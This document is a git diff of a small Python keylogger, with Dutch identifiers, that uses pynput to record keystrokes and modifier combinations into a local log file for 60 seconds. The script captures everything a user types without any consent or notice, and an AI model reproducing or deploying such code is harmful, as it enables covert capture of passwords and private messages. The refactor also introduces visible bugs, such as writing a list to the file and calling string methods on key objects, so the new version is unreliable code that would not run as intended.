@@ -2,36 +2,55 @@ import time
 from pynput import keyboard
 
 SPECIALE_KEYS = {
-    "Key.space": " ", "Key.enter": "[ENTER]\n", "Key.backspace": "[BACKSPACE]",
-    "Key.shift": "[SHIFT]", "Key.ctrl": "[CTRL]", "Key.alt": "[ALT]",
-    "Key.tab": "[TAB]", "Key.esc": "[ESC]"
+    "Key.space": " ",
+    "Key.enter": "[ENTER]\n",
+    "Key.backspace": "[BACKSPACE]",
+    "Key.shift": "[SHIFT]",
+    "Key.ctrl": "[CTRL]",
+    "Key.alt": "[ALT]",
+    "Key.tab": "[TAB]",
+    "Key.esc": "[ESC]"
 }
 
-mods, buffer = set(), []
-BUF_GROOTTE, FLUSH_TIJD, MAX_TIJD, start = 20, 5, 60, time.time()
+MOD_KEYS = [
+    "Key.shift",
+    "Key.ctrl",
+    "Key.alt"
+]
 
-def log_input(toets):
+mods = set()
+buffer = []
+BUF_GROOTTE = 20
+FLUSH_TIJD = 5
+MAX_TIJD = 60
+start = time.time()
+
+
+def save(log_file_name: str = "log.txt") -> str:
+    """ Schrijft de buffer naar een logfile """
     try:
-        t = SPECIALE_KEYS.get(str(toets).replace("'", ""), str(toets).replace("'", ""))
-        if mods:
-            t = "+".join(sorted(mods)) + f"+{t}"
-        buffer.append(t)
-        if len(buffer) >= BUF_GROOTTE:
-            save()
+        if buffer:
+            with open(log_file_name, "a") as file:
+                file.write(buffer)
+            buffer.clear()
+            return f"bestand opgeslagen als: {log_file_name}"
     except Exception as e:
-        print(f"error: {e}")
+        return f"Er ging iets mis: {e}"
 
-def bij_klik(toets):
+
+def on_keypress(toets):
+    print(type(toets))
     try:
-        t = str(toets).replace("'", "")
-        if t in {"Key.shift", "Key.ctrl", "Key.alt"}:
-            mods.add(t)
+        key = toets.replace("'", "")
+        if key in MOD_KEYS:
+            mods.add(key)
         else:
             log_input(toets)
     except Exception as e:
         print(f"error: {e}")
 
-def bij_los(toets):
+
+def on_release(toets):
     try:
         mods.discard(str(toets).replace("'", ""))
         if MAX_TIJD and (time.time() - start) > MAX_TIJD:
@@ -40,22 +59,33 @@ def bij_los(toets):
     except Exception as e:
         print(f"error: {e}")
 
-def save():
-    if buffer:
-        with open("inputlog.txt", "a") as f:
-            f.write(" ".join(buffer) + "\n")
-        buffer.clear()
 
-def start_ding():
-    with keyboard.Listener(on_press=bij_klik, on_release=bij_los) as l:
+def log_input(toets: str):
+    try:
+        t = SPECIALE_KEYS.get(toets.replace(
+            "'", ""), toets.replace("'", ""))
+        if mods:
+            t = "+".join(sorted(mods)) + f"+{t}"
+        buffer.append(t)
+        if len(buffer) >= BUF_GROOTTE:
+            save()
+    except Exception as e:
+        print(f"er ging iets mis: {e}")
+
+
+def start_listener():
+    with keyboard.Listener(on_press=on_keypress, on_release=on_release):
         try:
-            while not (MAX_TIJD and (time.time() - start) > MAX_TIJD):
+            while time.time() - start < MAX_TIJD:
                 time.sleep(FLUSH_TIJD)
                 save()
+
         except KeyboardInterrupt:
             save()
-            print("\nYo klaar.")
+
+        except Exception as e:
+            print(f'error: {e}')
+
 
 if __name__ == "__main__":
-    start_ding()
-
+    start_listener()
